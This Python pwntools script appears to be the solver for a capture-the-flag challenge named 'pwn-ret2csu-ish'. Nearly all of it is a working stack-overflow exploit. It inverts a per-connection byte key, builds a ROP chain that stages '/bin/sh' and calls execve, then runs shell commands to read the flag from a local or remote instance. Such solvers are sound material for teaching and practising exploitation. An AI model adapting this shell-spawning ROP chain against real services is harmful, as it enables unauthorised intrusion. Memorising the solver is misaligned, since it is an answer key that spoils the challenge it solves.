#!/usr/bin/env python3
"""
Solver for pwn-ret2csu-ish.

Technique: static, no-PIE stack overflow -> ROP to execve("/bin/sh", 0, 0).

Two things make this more than a copy-paste static ROP:

  1. The fully-static image contains no "/bin/sh" string, so we first ROP a
     read(0, scratch, 16) to stage "/bin/sh\\0" into a fixed .bss buffer, then
     execve(scratch, 0, 0).

  2. Every connection prints a fresh 8-bit "landing key" K, and the program
     adds K (mod 256) to every byte before it lands on the stack. So a fixed
     chain is worthless: we read K from the banner and pre-image the whole
     chain byte-by-byte -- send (target - K) mod 256 for each byte.

Argument marshalling uses the "ret2csu-ish" universal gadget the binary ships
(mov rdi,r13 ; mov rsi,r14 ; mov rdx,r15 ; ret) fed by the classic
pop rbx;rbp;r12;r13;r14;r15;ret loader -- the same shape as the __libc_csu_init
gadget modern glibc dropped.

Usage:
    python3 solve.py                 # local: runs ./chall (or ../chall)
    python3 solve.py HOST PORT       # remote instance
"""
import sys
import time
from pwn import (
    context, ELF, ROP, process, remote, u64, p64, log,
)

context.clear(arch="amd64", os="linux", log_level="info")

HERE = __import__("os").path.dirname(__import__("os").path.abspath(__file__))
BIN_CANDIDATES = [HERE + "/../chall", HERE + "/chall", "./chall"]


def find_binary():
    import os
    for c in BIN_CANDIDATES:
        if os.path.exists(c):
            return os.path.abspath(c)
    raise SystemExit("could not locate the 'chall' binary next to the solver")


def preimage(payload: bytes, key: int) -> bytes:
    """The program computes stack = (input + key) mod 256, so invert it."""
    return bytes((b - key) & 0xFF for b in payload)


def build_chain(elf, rop):
    off = 88  # buf(rsp+0x10) -> saved RIP; see writeup for derivation

    csu_pop = elf.symbols["csu_pop"]          # pop rbx;rbp;r12;r13;r14;r15;ret
    marshal = elf.symbols["marshal_regs"]     # rdi=r13; rsi=r14; rdx=r15; ret
    syscall = elf.symbols["syscall_ret"]      # syscall; ret
    scratch = elf.symbols["scratch"]          # writable .bss, fixed address
    pop_rax = rop.find_gadget(["pop rax", "ret"])[0]

    J = 0xdead  # junk for rbx/rbp/r12

    def csu(rbx, rbp, r12, r13, r14, r15):
        return b"".join(p64(x) for x in (csu_pop, rbx, rbp, r12, r13, r14, r15))

    chain = b"A" * off
    # stage 1: read(0, scratch, 16)  -> stage "/bin/sh\0"
    chain += csu(J, J, J, 0, scratch, 16)     # r13=fd=0, r14=buf, r15=count
    chain += p64(marshal)                     # rdi=0, rsi=scratch, rdx=16
    chain += p64(pop_rax) + p64(0)            # SYS_read = 0
    chain += p64(syscall)
    # stage 2: execve(scratch, 0, 0)
    chain += csu(J, J, J, scratch, 0, 0)      # r13=path, r14=argv=0, r15=envp=0
    chain += p64(marshal)                     # rdi=scratch, rsi=0, rdx=0
    chain += p64(pop_rax) + p64(59)           # SYS_execve = 59
    chain += p64(syscall)
    return chain


def main():
    binpath = find_binary()
    elf = ELF(binpath, checksec=False)
    rop = ROP(elf)

    if len(sys.argv) >= 3:
        host, port = sys.argv[1], int(sys.argv[2])
        io = remote(host, port)
    else:
        io = process(binpath, env={"FLAG": "CTF{local-playtest-flag}"})

    # Read the per-connection landing key from the banner.
    io.recvuntil(b"landing key: 0x")
    key = int(io.recvn(2), 16)
    log.info("landing key = 0x%02x", key)

    chain = build_chain(elf, rop)
    io.recvuntil(b"payload> ")

    # Pre-image the chain through the additive transform, then send it.
    io.send(preimage(chain, key))

    # Ensure the first read() returns before we feed the read-stage bytes,
    # otherwise "/bin/sh" would be slurped into the wrong read.
    time.sleep(0.4)
    io.send(b"/bin/sh\x00" + b"\x00" * 8)  # 16 bytes into scratch

    # We now have a shell in the live service. The flag lives in the process
    # environment (execve here cleared envp, so we also read the runtime-only
    # /tmp/flag.txt the service wrote).
    time.sleep(0.4)
    io.sendline(b"echo FLAG=$FLAG; cat /tmp/flag.txt; id")
    time.sleep(0.4)
    try:
        data = io.recvrepeat(1.5)
    except Exception:
        data = b""
    sys.stdout.buffer.write(data)
    sys.stdout.flush()

    # Best-effort extract.
    import re
    m = re.search(rb"CTF\{[^}]*\}", data)
    if m:
        log.success("flag: %s", m.group(0).decode())
    else:
        log.warning("no flag matched; dropping to interactive")
        io.interactive()


if __name__ == "__main__":
    main()
